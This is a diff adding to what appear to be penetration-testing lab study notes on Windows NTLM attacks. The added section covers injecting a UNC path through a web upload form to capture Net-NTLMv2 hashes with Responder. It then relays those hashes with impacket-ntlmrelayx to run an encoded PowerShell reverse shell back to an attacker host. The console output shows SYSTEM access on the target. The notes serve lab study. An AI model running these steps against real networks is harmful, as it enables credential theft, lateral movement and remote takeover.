@@ -641,3 +641,42 @@ $ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
 
 Use the cracked password to connect to the target over RDP.
 
+Extra example: Does your webapp have a form upload? Submit a file named \\\\192.168.45.189\\test\noexist with content \\\\192.168.45.189\\test\noexist to the form and watch over burpsuite for anything you can alter. Your Responder may capture this auth to it's SMB share and get the hash. NOTE that Burp uses \ as an escape, so and one \ used needs a \ next to it, hence the many slashes in the \\\\192.168.45.189\\test\noexist.
+
+### Replaying Net-NTLMv2
+
+Say we have access as an unprivileged user, so no Mimikatz, we tried Responder, but can't crack the hash we intercepted. If the access we have looks to be a local administrator on another machine, try to do a relay attack.
+
+We'll use the dir command again to get back to the bind shell we already have and create an SMB connection to our Kali. Instead of printing the collected hash, we'll forward it to the second target. If the relayed auth works and is from a user with local admin privileges, we can use it to auth to that machine and then execute commands over SMB with methods similar to those used by psexec or wmiexec.
+
+Note: Here, we don't use the local Administrator user for the relat attack like we did for PtH - so the target needs to have UAC remote restrictions disabled or command execution will fail. If UAC remote restrictions are enabled on a target, we can only use the local Administrator user for the relay.
+
+Let's use ntlmrelayx from the impacket library for this, which will set up an SMB server and relay the auth part of an incoming SMB connection to a target we choose. Use impacket-ntlmrelayx with --no-http-server, -smb2support, -t 111.111.111.111, and -c <command>. For the command, we will use a PS reverse shell one liner, base64 encoded executed as "powershell -enc JABjAGwAa..."
+
+```console
+$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
+// the powershell command here is the same as from Common Web App Attacks:Using Executable Files, ip in powershell command should be kali attacker with port 8080
+
+// new tab
+$ nc -nvlp 8080
+C:\Windows\system32>whoami
+whoami
+files01\files02admin
+C:\Windows\system32>dir \\192.168.119.2\test    // connect to kali smb share
+
+// in ntlmrelayx tab we should see:
+[*] SMBD-Thread-4: Received connection from 192.168.50.211, attacking target smb://192.168.50.212
+[*] Authenticating against smb://192.168.50.212 as FILES01/FILES02ADMIN SUCCEED
+[*] SMBD-Thread-6: Connection from 192.168.50.211 controlled, but there are no more targets left!
+...
+[*] Executed specified command on host: 192.168.50.212
+
+// in nc listener tab we get shell
+connect to [192.168.119.2] from (UNKNOWN) [192.168.50.212] 49674
+whoami
+nt authority\system
+PS C:\Windows\system32> hostname
+FILES02
+```
+
+Additional Example: Do you have powershell command injection on a web server through? Try to set up the powershell oneliner.
